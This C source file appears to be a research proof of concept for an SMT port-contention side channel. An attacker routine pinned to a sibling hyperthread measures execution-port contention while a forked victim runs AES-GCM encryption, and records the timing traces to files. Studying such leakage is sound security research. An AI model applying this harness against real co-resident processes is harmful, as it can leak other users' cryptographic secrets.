#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <pthread.h>
#include "libxom-aes-gcm.h"

#define countof(x) (sizeof(x)/sizeof(*(x)))

#define RUNS_PER_PORT  0x400
#define NUM_SAMPLES    300

#define NUM_BLOCKS      0x80

extern uintptr_t aes_gctr_linear(void *icb, void* x, void *y, unsigned int num_blocks);

extern void contend_p0(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p1(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p5(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p06(unsigned long* out_buf, unsigned long num_entries);

volatile unsigned char* sync_page = NULL;


static void set_processor_affinity(unsigned int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

static uint32_t get_sibling_cores(){
    const static size_t max_cpu_cores = 0x100;
    char *line = NULL;
    unsigned int corenum;
    int parsed, count = 0, i, j;
    size_t len = 0;
    FILE* info;
    uint8_t cpu_cores[max_cpu_cores];

    info = fopen( "/proc/cpuinfo", "r");
    if(!info)
        return 1 << 16;

    // Get amount of executable memory regions
    while (getline(&line, &len, info) > 0 && count < max_cpu_cores) {
        parsed = sscanf(line, "core id\t\t: %u", &corenum);
        free(line);
        line = NULL;
        if(parsed <= 0)
            continue;
        cpu_cores[count++] = (uint8_t) corenum;
    }

    fclose(info);

    for(i = count - 1; i >= 0; i--) {
        for(j = i - 1; j >= 0; j--) {
            if(cpu_cores[i] == cpu_cores[j])
                return (((uint32_t) i) << 16) | (uint32_t) j;
        }
    }

    return 1 << 16;
}

// The victim simply waits for the attacker to synchronize, and then starts the encryption
static void __attribute__((noreturn)) victim() {
    aes_uint128 icb = {.u64={0, 0}}, x[NUM_BLOCKS] = {{.u64={0, 0}},}, y[NUM_BLOCKS] = {{.u64={0, 0}},};
    *sync_page = 1;
    for(;;) {
        while (!*sync_page) { asm volatile("lfence");}
        aes_gctr_linear(&icb, &x, &y, NUM_BLOCKS);
        asm volatile(".rept 1024\nnop\nlfence\n.endr");
        aes_gctr_linear(&icb, &x, &y, NUM_BLOCKS);
        *sync_page = 0;
    }
}

static void attacker() {
    /*
    uint64_t t1, t2, A = 0;

    for (unsigned I = 0; I < 5; I++){
        *sync_page = 1;
        while(*sync_page) {asm volatile("lfence");}
    }
    for(unsigned I = 0; I < 0x1000; I++){
        *sync_page = 1;
        asm volatile("mfence\nrdtsc\nmfence" : "=a"(t1) :: "rdx");
        while(*sync_page) {asm volatile("lfence");}
        asm volatile("rdtsc" : "=a"(t2) :: "rdx");

        A += t2 - t1;
    }
    printf("%lu\n", A / 0x1000);
    printf("Done.\n");
    return;
    */


    unsigned i, j;
    static uint64_t result_buffer[NUM_SAMPLES];
    const static struct {
        const char* out_path;
        void (*contention_method)(unsigned long*, unsigned long);
    } ports[] = {
            {"p0.bin", contend_p0},
            {"p1.bin", contend_p1},
            {"p5.bin", contend_p5},
            {"p06.bin", contend_p06},
    };
    FILE* files[countof(ports)];

    for(i = 0; i < countof(ports); i++)
        files[i] = fopen(ports[i].out_path, "w");

    // Make sure everything is cached on the victim's side
    for(i = 0; i < 5; i++){
        *sync_page = 1;
        while(*sync_page) {asm volatile("lfence");}
    }


    // Run the actual attack
    for(i = 0; i < countof(ports); i++) {
        for (j = 0; j < RUNS_PER_PORT; j++) {
            *sync_page = 1;
            ports[i].contention_method(result_buffer, countof(result_buffer));
            fwrite(result_buffer, sizeof(*result_buffer), countof(result_buffer), files[i]);
            while(*sync_page) {asm volatile("lfence");}
        }
        fclose(files[i]);
    }
    puts("Done");
}


int main() {
    static unsigned char plain[0x1000], cipher[0x1000];
    static aes_uint128 iv = {.u64 = { 0xcafebabecafebabe, 0xdeafbeefdeadbeef}};
    static aes_uint128 tag = {.u64 = { 0, 0}};

    uint32_t cores = get_sibling_cores();

    // Set up sync page
    sync_page = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *sync_page = 0;

    printf("Running on cores %u and %u!\n", cores & 0xff, cores >> 16);

    // Fork and pivot to SMT sibling cores
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        set_processor_affinity(cores >> 16);
        victim();
    }

    set_processor_affinity(cores & 0xff);
    attacker();

    return 0;
}